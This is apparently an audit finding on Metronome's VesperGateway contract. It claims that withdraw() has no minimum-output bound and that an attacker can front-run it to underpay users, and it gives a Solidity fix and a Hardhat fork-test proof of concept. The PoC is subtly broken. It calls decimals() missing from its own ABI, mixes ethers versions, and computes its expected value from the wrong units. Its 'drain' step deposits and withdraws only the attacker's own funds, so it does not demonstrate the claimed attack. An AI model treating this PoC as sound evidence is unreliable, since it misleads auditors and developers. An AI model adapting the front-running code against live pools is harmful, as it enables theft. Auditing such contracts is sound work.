### Title
VesperGateway withdrawals can underpay users when Vesper liquidity changes - ([File: contracts/VesperGateway.sol](contracts/VesperGateway.sol))

### Summary
`VesperGateway.withdraw()` burns a fixed amount of a user's `DepositToken`, withdraws the corresponding Vesper shares, and forwards whatever underlying amount the external Vesper pool returns, without a `minUnderlyingOut` bound. [1](#0-0)  Metronome already accounts for Vesper withdrawals returning less than requested in `AMO._withdrawFromVesper()`, but the user-facing gateway does not enforce a minimum. [2](#0-1) 

### Finding Description
The withdrawal flow first transfers `amount_` deposit tokens from the caller to the gateway. [3](#0-2)  `DepositToken.withdraw()` then quotes the net withdrawal, burns the returned amount from the gateway, and pulls that amount of Vesper shares from `Treasury`. [4](#0-3) 

The gateway subsequently calls `vToken_.withdraw(_vTokenAmount)` and computes the user's payment as the external underlying token's balance delta. [5](#0-4)  There is no check that `_underlyingAmount` equals the expected share value or exceeds a caller-supplied minimum. [5](#0-4) 

An unprivileged attacker holding or acquiring Vesper shares can front-run a victim's withdrawal and remove the Vesper pool's currently available underlying liquidity. [6](#0-5)  Where the configured Vesper pool performs a partial withdrawal because of liquidity constraints, the victim's Metronome shares are burned while the gateway forwards only the reduced amount returned by the pool. [7](#0-6)  The attacker can retain residual Vesper shares and later redeem the value left behind by the victim's underpayment.

The `nonReentrant` guard does not prevent a separate front-running transaction, and the only gateway precondition is that `pool_` is registered. [8](#0-7) 

### Impact Explanation
This breaks the expected collateral-redemption invariant that burning a user's `DepositToken` returns the value represented by the corresponding Vesper shares. [9](#0-8)  A victim can permanently lose collateral because their `DepositToken` position is consumed before the unpredictable external withdrawal output is forwarded. [10](#0-9) 

### Likelihood Explanation
The attack requires a supported Vesper collateral whose pool has limited immediately withdrawable liquidity and an attacker able to acquire enough Vesper shares to affect that liquidity. [11](#0-10)  No privileged Metronome role is needed because the attacker interacts directly with the external Vesper pool and can front-run the public `VesperGateway.withdraw()` call. [3](#0-2) 

### Recommendation
Add a `minUnderlyingOut_` parameter to `VesperGateway.withdraw()` and revert when the measured balance delta is below it. [5](#0-4) 

```solidity
function withdraw(
    IPool pool_,
    IVPool vToken_,
    uint256 amount_,
    uint256 minUnderlyingOut_
) external nonReentrant {
    ...
    uint256 _underlyingAmount = _underlying.balanceOf(address(this)) - _balanceBefore;
    if (_underlyingAmount < minUnderlyingOut_) revert UnderlyingSlippageTooHigh();
    _underlying.safeTransfer(_msgSender, _underlyingAmount);
}
```

### Proof of Concept
The following Hardhat fork test uses a registered Metronome pool and one of its configured Vesper-backed `DepositToken`s. [12](#0-11) 

```ts
import {ethers, deployments} from "hardhat";
import {expect} from "chai";

const IERC20 = [
  "function approve(address,uint256)",
  "function balanceOf(address) view returns(uint256)",
];

const IVPool = [
  ...IERC20,
  "function token() view returns(address)",
  "function deposit(uint256)",
  "function withdraw(uint256)",
  "function pricePerShare() view returns(uint256)",
];

it("underpays a gateway withdrawal after liquidity is drained", async () => {
  const [victim, attacker] = await ethers.getSigners();

  const gatewayDeployment = await deployments.get("VesperGateway");
  const gateway = await ethers.getContractAt(
    "VesperGateway",
    gatewayDeployment.address
  );

  const poolDeployment = await deployments.get("Pool");
  const pool = await ethers.getContractAt("IPool", poolDeployment.address);

  // Locate a deployed DepositToken whose collateral is a Vesper pool.
  let vPool;
  let depositToken;
  for (const candidate of await pool.getDepositTokens()) {
    const dt = await ethers.getContractAt("IDepositToken", candidate);
    const maybeVPool = await ethers.getContractAt(IVPool, await dt.underlying());
    if (await pool.depositTokenOf(maybeVPool.address) === candidate) {
      depositToken = dt;
      vPool = maybeVPool;
      break;
    }
  }
  expect(vPool).to.not.equal(undefined);

  const underlying = await ethers.getContractAt(IERC20, await vPool.token());
  const amountIn = ethers.parseUnits("100", await underlying.decimals());

  // Victim deposits underlying through the gateway.
  await underlying.connect(victim).approve(gateway.address, amountIn);
  await gateway.connect(victim).deposit(pool.address, vPool.address, amountIn);

  const msdAmount = await depositToken.balanceOf(victim.address);
  const expected = await vPool.pricePerShare() * msdAmount / ethers.parseEther("1");

  // Attacker acquires Vesper shares and drains currently available liquidity.
  await underlying.connect(attacker).approve(vPool.address, amountIn);
  await vPool.connect(attacker).deposit(amountIn);
  await vPool.connect(attacker).withdraw(await vPool.balanceOf(attacker.address));

  // Victim's deposit shares are burned and only the partial external output is sent.
  const before = await underlying.balanceOf(victim.address);
  await depositToken.connect(victim).approve(gateway.address, msdAmount);
  await gateway.connect(victim).withdraw(pool.address, vPool.address, msdAmount);
  const received = await underlying.balanceOf(victim.address) - before;

  expect(received).to.be.lessThan(expected);
  expect(await depositToken.balanceOf(victim.address)).to.equal(0);
});
```

### Citations

**File:** contracts/VesperGateway.sol (L44-64)
```text
    function deposit(IPool pool_, IVPool vToken_, uint256 amount_) external override {
        if (!_poolRegistry.isPoolRegistered(address(pool_))) revert UnregisteredPool();

        address _msgSender = _msgSender();

        // 1. Get `underlying` asset
        IERC20 _underlying = IERC20(vToken_.token());
        _underlying.safeTransferFrom(_msgSender, address(this), amount_);

        // 2. Deposit `underlying` to `VPool`
        _underlying.safeApprove(address(vToken_), 0);
        _underlying.safeApprove(address(vToken_), amount_);
        uint256 _balanceBefore = vToken_.balanceOf(address(this));
        vToken_.deposit(amount_);
        uint256 _vTokenAmount = vToken_.balanceOf(address(this)) - _balanceBefore;

        // 3. Deposit `VPool` to `Synth` and send `msdTokens` to the `_msgSender()`
        IDepositToken _depositToken = pool_.depositTokenOf(vToken_);
        vToken_.safeApprove(address(_depositToken), 0);
        vToken_.safeApprove(address(_depositToken), _vTokenAmount);
        _depositToken.deposit(_vTokenAmount, _msgSender);
```

**File:** contracts/VesperGateway.sol (L67-72)
```text
    /**
     * @notice Withdraws the `vToken` deposit of _msgSender().
     * @param pool_ The Pool contract
     * @param vToken_ The vToken to withdraw
     * @param amount_ The amount of deposit tokens to withdraw and receive underlying
     */
```

**File:** contracts/VesperGateway.sol (L73-92)
```text
    function withdraw(IPool pool_, IVPool vToken_, uint256 amount_) external override nonReentrant {
        if (!_poolRegistry.isPoolRegistered(address(pool_))) revert UnregisteredPool();

        address _msgSender = _msgSender();

        // 1. Get `msdTokens`
        IDepositToken _depositToken = pool_.depositTokenOf(vToken_);
        _depositToken.safeTransferFrom(_msgSender, address(this), amount_);

        // 2. Withdraw `vTokens` from `Synth`
        (uint256 _vTokenAmount, ) = _depositToken.withdraw(amount_, address(this));

        // 3. Withdraw `underlying` from `VPool`
        IERC20 _underlying = IERC20(vToken_.token());
        uint256 _balanceBefore = _underlying.balanceOf(address(this));
        vToken_.withdraw(_vTokenAmount);
        uint256 _underlyingAmount = _underlying.balanceOf(address(this)) - _balanceBefore;

        // 4. Transfer `underlying` to the `_msgSender()`
        _underlying.safeTransfer(_msgSender, _underlyingAmount);
```

**File:** contracts/AMO.sol (L137-146)
```text
    function _withdrawFromVesper(
        ISyntheticToken syntheticToken_,
        IVPool vPool_,
        uint256 shares_
    ) private returns (uint256) {
        // Vesper pool may withdraw less, of course burn less shares too, than requested.
        // Hence the difference of Synth balance after withdraw and before withdraw is actual Synth withdrawn.
        uint256 _before = syntheticToken_.balanceOf(address(this));
        vPool_.withdraw(shares_);
        return syntheticToken_.balanceOf(address(this)) - _before;
```

**File:** contracts/DepositToken.sol (L536-553)
```text
    function _withdraw(
        address account_,
        uint256 amount_,
        address to_
    ) private whenNotShutdown nonReentrant onlyIfDepositTokenExists returns (uint256 _withdrawn, uint256 _fee) {
        if (amount_ == 0) revert AmountIsZero();

        IPool _pool = pool;

        (_withdrawn, _fee) = quoteWithdrawOut(amount_);
        if (_fee > 0) {
            _transfer(account_, _pool.feeCollector(), _fee);
        }

        _burn(account_, _withdrawn);
        _pool.treasury().pull(to_, _withdrawn);

        emit CollateralWithdrawn(account_, to_, amount_, _withdrawn, _fee);
```

**File:** contracts/interfaces/external/IVPool.sol (L10-16)
```text
    function deposit(uint256 _amount) external;

    function withdraw(uint256 _shares) external;

    function poolRewards() external view returns (address);

    function pricePerShare() external view returns (uint256);
```
